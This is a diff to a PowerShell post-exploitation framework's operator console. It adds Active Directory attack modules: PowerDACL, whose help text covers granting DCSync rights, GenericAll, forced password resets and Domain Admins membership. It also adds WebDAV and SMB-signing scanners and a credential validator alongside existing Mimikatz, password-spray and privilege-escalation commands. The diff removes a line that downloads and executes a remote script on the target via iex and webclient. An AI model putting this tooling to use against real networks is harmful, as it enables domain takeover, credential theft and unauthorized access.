@@ -1999,7 +1999,31 @@ function Start-LocalShell {
         'Monitor'          = @{ tools=@('TGT_Monitor');                                          invoke=$null }
         'PPL'              = @{ tools=@('ppl');                                                  invoke=$null }
         'MultiRDP'         = @{ tools=@('TermsrvPatcher');                                       invoke=$null }
-        'CredValidate'     = @{ tools=@('Validate-Credentials');                                 invoke=$null }
+        'CredValidate'     = @{ tools=@('Validate-Credentials');  invoke=$null
+                                hint=@(" [*] Validate-Credentials -UserName <user> -Password <pass>"
+                                       " [*]   -Domain <domain>          specify domain explicitly"
+                                       " [*] Example: Validate-Credentials -UserName Administrator -Password P@ssw0rd!"
+                                       " [*] Example: Validate-Credentials -UserName hodor -Domain NORTH.SEVENKINGDOMS.LOCAL") }
+        'PowerDACL'        = @{ tools=@('PowerDACL');             invoke='PowerDACL'
+                                hint=@(" [*] AD DACL abuse (all actions require -TargetDomain <dom> -TargetServer <DC>):"
+                                       " [*]   DCSync -Target <user>                              Grant DCSync rights"
+                                       " [*]   GenericAll -Target <obj> -Grantee <user>           Grant GenericAll"
+                                       " [*]   ForceChangePass -Target <user> -Password <pass>    Reset password"
+                                       " [*]   AddToGroup -Target <user> -Group 'Domain Admins'   Add to group"
+                                       " [*]   RBCD -Target <computer$> -Grantee <user>           Set RBCD"
+                                       " [*]   SetOwner -Target <obj> -Owner <user>               Change owner"
+                                       " [*]   SetSPN | RemoveSPN | EnableAccount | DisableAccount | AddComputer | RemoveFromGroup") }
+        'CheckWebDAV'      = @{ tools=@('CheckWebDAVStatus');     invoke=$null
+                                hint=@(" [*] CheckWebDAVStatus -Domain <domain>           Scan all domain hosts"
+                                       " [*]   -Targets <ip,ip or 10.x.x.0/24>           Specific targets"
+                                       " [*]   -Sessions                                  Hunt active user sessions"
+                                       " [*]   -Enable / -Disable                        Deploy or remove WebDAV"
+                                       " [*] Example: CheckWebDAVStatus -Domain NORTH.SEVENKINGDOMS.LOCAL") }
+        'CheckSMBSigning'  = @{ tools=@('CheckSMBSigning');       invoke=$null
+                                hint=@(" [*] CheckSMBSigning -Domain <domain>             Scan all domain hosts"
+                                       " [*]   -Targets <ip,ip or 10.x.x.0/24>           Specific targets"
+                                       " [*]   -OutputFile <path>                         Save results to file"
+                                       " [*] Example: CheckSMBSigning -Domain NORTH.SEVENKINGDOMS.LOCAL") }
         'DCSync'           = @{ tools=@('Sync');                                                 invoke=$null }
         'Impersonation'    = @{ tools=@('Token-Impersonation');                                  invoke=$null }
         'LocalAdminAccess' = @{ tools=@('Find-LocalAdminAccess');                                invoke=$null
@@ -2112,6 +2136,9 @@ function Start-LocalShell {
             Write-Output "   dcom               DCOM delivery (no admin, needs active session) -- dcom computername=<ip> [method=ShellWindows|ShellBrowserWindow|MMC20]"
             Write-Output "   SessionHunter      Hunt for active user sessions"
             Write-Output "   PsMapExec          Network attacks/mapping - use: PsMapExec <Method> -Targets <targets> [-Domain <domain>]"
+            Write-Output "   PowerDACL          Abuse AD DACLs (DCSync, GenericAll, RBCD, ForceChangePass...) -- PowerDACL -h for usage"
+            Write-Output "   CheckWebDAV        Check WebDAV/EFS status and hunt sessions across domain -- CheckWebDAV -h for usage"
+            Write-Output "   CheckSMBSigning    Scan for hosts without SMB signing -- CheckSMBSigning -h for usage"
             Write-Output ""
             Write-Output " [+] LPE:"
             Write-Output "   PowerUp            Run Invoke-AllChecks (PowerUp privilege escalation checks)"
@@ -2139,6 +2166,20 @@ function Start-LocalShell {
         if ($cmdMatch) {
             try { & $_cmd[$cmdMatch] }
             catch { Write-Output " [-] $($_.Exception.Message)" }
+            continue
+        }
+
+        # ── -h / -help flag — show hints without loading tool ────────────────
+        if ($cmd -match '^(\S+)\s+-h(?:elp)?\s*$') {
+            $kwH = $Matches[1]
+            $kwHMatch = $_kw.Keys | Where-Object { $_ -ieq $kwH } | Select-Object -First 1
+            if ($kwHMatch -and $_kw[$kwHMatch].hint) {
+                Write-Output ""
+                $_kw[$kwHMatch].hint | ForEach-Object { Write-Output $_ }
+                Write-Output ""
+            } elseif ($kwHMatch) {
+                Write-Output " [*] No usage hints available for '$kwH'. Load it and run without args for built-in help."
+            }
             continue
         }
 
@@ -3552,7 +3593,7 @@ function InteractWithPipeSession{
 			"ClearLogs", "ClearHistory"
 		)
 
-  		if($command -like "Kerb" -OR $command -like "Invoke-PassSpray*" -OR $command -like "DCSync" -OR $command -like "Access_Check*" -OR $command -like "Find-LocalAdminAccess*" -OR $command -like "Invoke-SessionHunter*" -OR $command -like "AutoMimi*" -OR $command -like "Mimi*" -OR $command -like "KrbRelayUp*" -OR $command -like "PrivescCheck" -OR $command -like "PowerUp" -OR $command -like "GodPotato" -OR $command -like "Invoke-PrivescCheck*" -OR $command -like "Invoke-AllChecks*"){
+  		if($command -like "Kerb" -OR $command -like "Invoke-PassSpray*" -OR $command -like "DCSync" -OR $command -like "Access_Check*" -OR $command -like "Find-LocalAdminAccess*" -OR $command -like "Invoke-SessionHunter*" -OR $command -like "AutoMimi*" -OR $command -like "Mimi*" -OR $command -like "KrbRelayUp*" -OR $command -like "PrivescCheck" -OR $command -like "PowerUp" -OR $command -like "GodPotato" -OR $command -like "Invoke-PrivescCheck*" -OR $command -like "Invoke-AllChecks*" -OR $command -like "CheckWebDAVStatus*" -OR $command -like "CheckSMBSigning*" -OR $command -like "PowerDACL*"){
 			$global:RestoreTimeout = $True
 			$timeoutSeconds = 300
 		}
@@ -3801,20 +3842,66 @@ function InteractWithPipeSession{
 		}
 		
 		elseif ($command -eq 'CredValidate') {
-			
 			Write-Output ""
-			Write-Output "[+] Validate Domain Credentials | https://github.com/Leo4j/Validate-Credentials"
+			Write-Output " [+] Sending Validate-Credentials to target..."
+			if (Send-Module -ToolName 'Validate-Credentials' -Writer $sw -Reader $sr) {
+				Write-Output " [+] Validate-Credentials loaded"
+				Write-Output ""
+				Write-Output "     Validate-Credentials -UserName <user> -Password <pass>"
+				Write-Output "     Validate-Credentials -UserName <user> -Password <pass> -Domain <domain>"
+				Write-Output "     Validate-Credentials -UserName <user> -Domain <domain>  (test empty password)"
+				Write-Output ""
+			} else {
+				Write-Output " [-] Validate-Credentials not in cache. Add Validate-Credentials.ps1 to Tools\ and run: modules reload"
+				continue
+			}
+		}
+
+		elseif ($command -eq 'PowerDACL') {
 			Write-Output ""
-			Write-Output "[+] Usage:"
-   			Write-Output ""
-			Write-Output "    Validate-Credentials -UserName Senna -Password FuerteCorre1                         Test Credentials"
+			Write-Output " [+] Sending PowerDACL to target..."
+			if (Send-Module -ToolName 'PowerDACL' -Writer $sw -Reader $sr) {
+				Write-Output " [+] PowerDACL loaded -- running help"
+				Write-Output ""
+				$sw.WriteLine("PowerDACL")
+				$sw.Flush()
+			} else {
+				Write-Output " [-] PowerDACL not in cache. Add PowerDACL.ps1 to Tools\ and run: modules reload"
+				continue
+			}
+		}
+
+		elseif ($command -eq 'CheckWebDAV') {
 			Write-Output ""
-			Write-Output "    Validate-Credentials -UserName Senna -Password FuerteCorre1 -Domain ferrari.local   Specify Domain"
+			Write-Output " [+] Sending CheckWebDAVStatus to target..."
+			if (Send-Module -ToolName 'CheckWebDAVStatus' -Writer $sw -Reader $sr) {
+				Write-Output " [+] CheckWebDAVStatus loaded"
+				Write-Output ""
+				Write-Output "     CheckWebDAVStatus -Domain <domain>"
+				Write-Output "     CheckWebDAVStatus -Targets <ip,ip or 10.x.x.0/24>"
+				Write-Output "     CheckWebDAVStatus -Domain <domain> -Sessions    (hunt active sessions)"
+				Write-Output "     CheckWebDAVStatus -Domain <domain> -Enable      (deploy WebDAV)"
+				Write-Output ""
+			} else {
+				Write-Output " [-] CheckWebDAVStatus not in cache. Add CheckWebDAVStatus.ps1 to Tools\ and run: modules reload"
+				continue
+			}
+		}
+
+		elseif ($command -eq 'CheckSMBSigning') {
 			Write-Output ""
-			Write-Output "    Validate-Credentials -UserName Senna -Domain ferrari.local                          Test Empty Password"
-			
-			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Validate-Credentials.ps1')")
-			$sw.Flush()
+			Write-Output " [+] Sending CheckSMBSigning to target..."
+			if (Send-Module -ToolName 'CheckSMBSigning' -Writer $sw -Reader $sr) {
+				Write-Output " [+] CheckSMBSigning loaded"
+				Write-Output ""
+				Write-Output "     CheckSMBSigning -Domain <domain>"
+				Write-Output "     CheckSMBSigning -Targets <ip,ip or 10.x.x.0/24>"
+				Write-Output "     CheckSMBSigning -Domain <domain> -OutputFile <path>"
+				Write-Output ""
+			} else {
+				Write-Output " [-] CheckSMBSigning not in cache. Add CheckSMBSigning.ps1 to Tools\ and run: modules reload"
+				continue
+			}
 		}
 		
 		elseif ($command -eq 'PassSpray') {
@@ -7542,6 +7629,9 @@ function Get-AvailableCommands  {
 	Write-Output " PassSpray          Domain Password Spray"
 	Write-Output " Remoting           [A] Remote Command Execution SMB|WMI|WinRM"
 	Write-Output " SessionHunter      Hunt for Active User Sessions"
+	Write-Output " PowerDACL          Abuse AD DACLs (DCSync, GenericAll, RBCD, ForceChangePass...)"
+	Write-Output " CheckWebDAV        Check WebDAV/EFS status and hunt sessions"
+	Write-Output " CheckSMBSigning    Scan for hosts without SMB signing"
 	Write-Output ""
 	Write-Output ""
 	Write-Output " [+] LPE:"
